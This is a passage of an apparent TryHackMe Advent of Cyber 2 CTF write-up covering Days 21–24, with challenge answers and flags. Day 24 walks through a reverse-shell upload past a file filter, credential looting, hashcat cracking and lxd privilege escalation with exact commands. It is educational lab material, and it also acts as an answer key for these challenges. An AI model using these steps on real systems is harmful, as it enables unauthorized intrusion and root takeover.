   ><details><summary>Click for answer</summary>THM{f6187e6cbeb1214139ef313e108cb6f9}</details>

4. What is the flag that is displayed when you run the database connector file?

   From the strings results we can see a command related to ADS (due to the `-stream` argument).
   
   ![Database Stream](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Database_Stream.png)
   
   We can use powershell to find datastreams in a binary.
   
   ```cmd
   Get-Item -Path "C:\Users\littlehelper\Documents\deebee.exe" -Stream *
   ```
   
   ![Streams](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Streams.png)
   
   Looks like there is a second datastream called `hidedb`.
   
   We can now execute the hidden file from within the executable.
   
   ```cmd
   wmi process call create $(Resolve-Path C:\Users\littlehelper\Documents\deebee.exe:hidedb)
   ```
   
   ![Execute Stream](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Execute_Stream.png)
   
   This executes the file and gives us another window.
   
   ![Loading Screen](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Loading.png)
   
   After the program has loaded, we can see the flag.
   
   ![Menu Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Menu.png)

   ><details><summary>Click for answer</summary>THM{3088731ddc7b9fdeccaed982b07c297c}</details>

### [Day 22] [Elf McEager becomes CyberElf](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2022)

In this task we must try to decode several passwords for the Keepass database using CyberChef.

- **Username:** Administrator
- **Password:** sn0wF!akes!!!
- **Master Password:** mceagerrockstar

1. What is the password to the KeePass database?

   In the Windows machine we find a folder containing the database.
   
   ![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Folder.png)
   
   Filling in the supplied masterkey we get an error message.
   
   ![Old Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Old_Key.png)
   
   ![Wrong Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Wrong_Key.png)
   
   The folder name looks a little cryptic. Maybe it has a clue for the password. Looking at the name, it looks like a Base64 encoding. Lets open up CyberChef and copy the string. CyberChef will automatically suggest an encoding if it finds a match (even without using the magic recipe). This is indeed Base64 encoded. 
   
   ![Decode](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Decode.png)
   
   Fortunately, we can indeed log in with this password.
   
   ![New Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_New_Key.png)

   ><details><summary>Click for answer</summary>thegrinchwashere</details>

2. What is the encoding method listed as the 'Matching ops'?
   
   This is the encoding method we used in the previous step. Using the `magic` recipe we get a suggestion for the matching ops.

   ><details><summary>Click for answer</summary>base64</details>

3. What is the decoded password value of the Elf Server?

   If we open the password entry we can see a weird string as password (which probably is not correct) and a note. Judging from the string format it looks like hexadecimal encoding. The note does indeed hint in the direction of Hex encoding.
   
   ![Elf Server](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Server.png)
   
   We can copy the string into CyberChef and it will also suggest Hex encoding. This yields us the correct password for the server.
   
   ![Elf Server Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Server_Decode.png)

   ><details><summary>Click for answer</summary>sn0wM4n!</details>

4. What is the decoded password value for ElfMail?

   Opening the mail password entry, we get a hint of `entities`. The string doesn't ring a bell yet. 
   
   ![Elf Email](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Mail.png)
   
   We can put the string into CyberChef and search for `entities`. This will result in `HTML Entinty`. However, CyberChef already suggested this encoding method after pasting the string.
   
   ![Elf Mail Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Mail_Decode.png)

   ><details><summary>Click for answer</summary>ic3Skating!</details>

5. Decode the last encoded value. What is the flag?

   For the security system, we probably have to use the note as our password.
   
   ![Elf Security](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security.png)
   
   Looks like it is a Charcode encoding. After adding the recipe in CyberChef, we don't have a result yet. I tried several things, but then consulted the documentation for this encoding. We can try different separators and base numbers until we get something coherent. Base 10 seems to be what we are looking for.
   
   ![Elf Security Pre Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security_Pre_Decode.png)
   
   Since this is not a valid password yet, we can try adding the decode step a second time.
   
   ![Elf Security Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security_Decode.png)
   
   Looks like we are given a Github page which will contain a flag. Unfortunately, the page has since been removed from Github..
   
   ![Gist](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Gist.png)
   
   Luckily, I managed to find the flag through some searching on Google.

   ![Github Flag](https://sckull.github.io/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.54.04.png)

   Courtesy of [sckull](https://sckull.github.io/posts/aoc2020/#day-22---elf-mceager-becomes-cyberelf)

   Answer courtesy of [Dhilip Sanjay S](https://dhilipsanjay.gitbook.io/ctfs/tryhackme/tryhackme/adventofcyber2/day22-elfmceagerbecomescyberelf)

   ><details><summary>Click for answer</summary>THM{657012dcf3d1318dca0ed864f0e70535}</details>

### [Day 23] [The Grinch strikes again!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2023)

In this task we will be using a Windows feature called Volume Shadow Copy Service (VSS) to restore our encrypted files.

**Username:** administrator

**Password:** sn0wF!akes!!!

1. Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?

   ![Encoded Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Message.png)
   
   On the desktop we can find a ransom note with a bitcoin address. This does, however, look awfully like a base64 encoded string. Lets use CyberChef to find out.
   
   ![Decoded Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Message_Decoded.png)

   ><details><summary>Click for answer</summary>nomorebestfestivalcompany</details>

2. At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?

   Navigating into the Documents folder we can see the extension of the encrypted files.
   
   ![File Extension](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_File_Extension.png)

   ><details><summary>Click for answer</summary>.grinch</details>

3. What is the name of the suspicious scheduled task?

   In the scheduled task window we can see several task. One of which seems suspicious.
   
   ![Scheduled Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Scheduled_Task.png)

   ><details><summary>Click for answer</summary>opidsfsdf</details>

4. Inspect the properties of the scheduled task. What is the location of the executable that is run at login?

   Clicking on the 'Actions' tab for the task gives us information of what happens when the task is triggered.
   
   ![File Location](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_File_Location.png)

   ><details><summary>Click for answer</summary>C:\Users\Administrator\Desktop\opidsfsdf.exe</details>

5. There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?

   If we look at the task for the VSS service, we can find the Volume ID in the Name field.
   
   ![Shadow Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Shadow_Task.png)
   
   This is identical to the ID listed by `vssadmin`.
   
   ![VSS Volumes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_VSS_Volumes.png)

   ><details><summary>Click for answer</summary>7a9eea15-0000-0000-0000-01000000000</details>

6. Assign the hidden partition a letter. What is the name of the hidden folder?

   To make the hidden drive, we must assign it a letter. This can be done by right clicking the partition and clicking 'Change Drive Letter'.
   
   ![Assign Letter](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Assign_Letter.png)
   
   Now we can select a letter which isn't is use yet.
   
   ![Drive Letter](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Drive_Letter.png)
   
   Inside this folder we can check the box to show hidden items. 
   
   ![Hidden Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Hidden_Folder.png)

   ><details><summary>Click for answer</summary>confidential</details>

7. Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?

   Restoring the encrypted (or the file in the hidden drive) to a previous version did not work for some reason. However, it was possible to simply open the file from the hidden drive to view the password.
   
   ![Password Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Password_Decoded.png)

   ><details><summary>Click for answer</summary>m33pa55w0rdIZseecure!</details>

### [Day 24] [The Trial Before Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2024)

In this final task we will be combining the knowledge of previous days to get access to the final machine in this challenge.

1. Scan the machine. What ports are open?

   Use `nmap` to get the open ports on the target machine.
   
   ```cmd
   nmap -sV 10.10.12.231
   ```
   
   ![Nmap Result](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Nmap.png)

   ><details><summary>Click for answer</summary>80, 65000</details>

2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 

   When we go the webserver in our browser we see a TryHackMe page. However, looking at the nmap results, we can see there is a second server serving content on port 65000. Navigating to this page directly we get a login page.
   
   ![Register Site](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Register.png)
  
   ><details><summary>Click for answer</summary>Light Cycle</details>

3. What is the name of the hidden php page?

   Looking through the assets from the server, we can see there are some images and links related to uploading files which we are interested in. Maybe we can create an account. I register an account with the following credentials:
   
   **Username:** mcskiddy
   **Password:** bestfestivalcompany
   
   Unfortunately, they probably knew we would try this... Nice..
   
   ![Nice](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Nice.png)
   
   Lets continue out search with `dirsearch`. Using Dirsearch we can find some hidden directories on the webserver. However, it didn't seem to find any hidden pages.
   
   ```cmd
   dirsearch -u http://10.10.12.231:65000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -e php
   ```
   
   ![Dir Search Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Dir_Search.png)
   
   So I tried using `dirb`, which did yield a result.
   
   ![Dirb Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Dirb_Results.png)
   
   ![Upload Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Uploads.png)

   ><details><summary>Click for answer</summary>uploads.php</details>

4. What is the name of the hidden directory where file uploads are saved?

   In the results from `dirb` we also find a directory called `grid`. This is most likely the opload folder as the others contain different data.

   ><details><summary>Click for answer</summary>grid</details>

Bypass the filters. Upload and execute a reverse shell. 

5. What is the value of the web.txt flag?

   In order to get a reverse shell on this machine we should upload a file to it. Unfortunately, it seems not only php files are filtered. Any image file is filtered.
   
   ![Invalid Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Invalid_Type.png)
   
   We need to get rid of the javascript responsible for the filtering. To do this we can use Burpsuite. First we must make some changes to the settings. Remove `^js$|` from the setting.
   
   ![Requests](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Burp_Requests.png)
   
   Then make sure the next checkbox is checked.
   
   ![Responses](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Burp_Responses.png)
   
   Now reload the upload page with proxyfoxy turned on. Now we must remove the javescript filter from the response to bypass the filetype filtering.
   
   ![Response Edit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Response.png)
   
   Now forward the response to the browser and prepare the payload for upload. First copy the php reverse shell and edit it to contain our attack machine ip and a specified port number.
   
   ![Shell Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Reverse_Shell_Script.png)
   
   Next we change the extension to `png.php` and upload the file to the server.
   
   ![Upload Success](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Upload_Success.png)
   
   Now navigate to the upload folder and execute the script **after** setting up a listener on the specified port.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   ![Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Listener.png)
   
   Now that we have a shell we can look for the file and reveal its contents.
   
   ```cmd
   find -name "web.txt" 2>/dev/null
   ```
   
   ![Web Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Flag_Web.png)

   ><details><summary>Click for answer</summary>THM{ENTER_THE_GRID}</details>

Upgrade and stabilize your shell. 

The shell we currently have is very rudementary, so we should probably stabalize it for more functionality. This can be done with the following commands.

```cmd
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

Ctrl + Z

stty raw -echo; fg
```

![Stabalize Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Stabalize_Shell.png)

6. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password

   For this step we can use our newly created shell to go through the files in the `/www/` folder. One folder in particular is of interest to us. dbauth.php.
   
   ![DB Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_DB_Authentication_Creds.png)
   
   Looks like there are some credentials present in this file we can use to get access to the database.

   ><details><summary>Click for answer</summary>tron:IFightForTheUsers</details>

7. Access the database and discover the encrypted credentials. What is the name of the database you find these in?

   To access the database we can use `mysql`. Normally, we would be able to access such a database remotely. However, for this task, we will be accessing it locally. **Note that -u and username have no space between them.**
   
   ```cmd
   mysql -utron -p
   ```
   
   ![Login Database](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Login_Database.png)
   
   First we must enumerate the database to find any interesting tables/entries. `show databases` is our first step.
   
   ![Show Databases](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Databases.png)
   
   Now we can do the same with the `tron` table.
   
   ```cmd
   use tron
   
   show tables
   ```
   
   ![Tron Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Tron_User_Creds.png)

   ><details><summary>Click for answer</summary>tron</details>

8. Crack the password. What is it?

   We can use `hash-identifier` to find out what hash type this password is in.
   
   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hash_Identifier.png)
   
   Now we can use `hashcat` to crack this password. Add the hash to a file and run the following command:
   
   ![Hash File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hash_File.png)
   
   ```cmd
   hashcat m 0 tron-password.hash /usr/share/wordlists/rockyou.txt
   ```
   
   ![Hash Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hashcat_Command.png)
   
   This gives us a result for the password.
   
   ![Hashcat Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hashcat_Password.png)

   ><details><summary>Click for answer</summary>@computer@</details>

Use su to login to the newly discovered user by exploiting password reuse. 

9. What is the value of the user.txt flag?

   With these credentials we can try switching use on this machine. First exit the mysql instance then use `su` to switch user.
   
   ```cmd
   su flynn
   ```
   
   ![Switch User](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Switch_User.png)
   
   Now we can look for the contents of the flag.
   
   ![Flynn Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Flynn_Flag.png)

   ><details><summary>Click for answer</summary>THM{IDENTITY_DISC_RECOGNISED}</details>

10. Check the user's groups. Which group can be leveraged to escalate privileges? 

    To get the group a user belongs to, we can use `id`. Looks like there is an extra group which we can exploit.
    
    ![Group ID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_ID.png)

    ><details><summary>Click for answer</summary>lxd</details>

Abuse this group to escalate privileges to root.

11. What is the value of the root.txt flag?

    To get root access, we will be xploiting a flaw in lxd. These are the steps necessary to perform this exploit. More information can be found [here](https://www.hackingarticles.in/lxd-privilege-escalation/).
    
    Steps to be performed on the attacking machine:
    - Download build-alpine on your local machine via the git repository
    - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.
    - Transfer this newly created tar file to the victim machine
    
    Steps to be performed on the victim machine:
    - Download the alpine image
    - Import image for lxd
    - Initialize the image inside a new container <- **Worth checking the already imported/available images as you may be able to skip to this step**
    - Mount the container inside the /root directory
    
    ![Lxc Images](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Lxc_Images.png)
    
    Checking for any available images, we can indeed see it is already present on the machine. This saves us a bunch of work and we can continue with initializing the container.
    
    ```cmd
    $ lxc init Alphine letmein -c security.privileged=true
    
    $ lxc config device add letmein rightnow disk source=/ path=/mnt/root recursive=true
    ```
    
    ![Lxc Initialize](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Lxc_Initialize.png)
    
    Now we can start the container and open a shell through it. Then we should check which user we are with `id`.
    
    ```cmd
    $ lxc start letmein
    
    $ lxc exec letmein /bin/sh
    ```
    
    ![Lxc Start](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Lxc_Start_Container.png)
    
    Perfect! Now we can navigate to the root flag and view its contents.
    
    ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Root_Flag.png)

    ><details><summary>Click for answer</summary>THM{FLYNN_LIVES}</details>

**This next part is optional, but I thought it was interesting enough to include here.**

During our directory enumeration, we found some other webpages as well. 

![Optional page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Optional_Site.png)

These seem to contain many links. Of which most probably link to the Rick roll video. We can make a python script to gather all the available links on the page for us to analyze. This is similar to what we did in day 16.

![Python Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Link_Script.png)

Running this we can a whole list of links from the page.

![Links](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Links.png)

Most of these indeed lead to a video, but one of them leads to an interesting discount. Which probably isn't valid anymore. So it is of no use, but it is an interesting exercise.

![Free Code](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Free_Code.png)
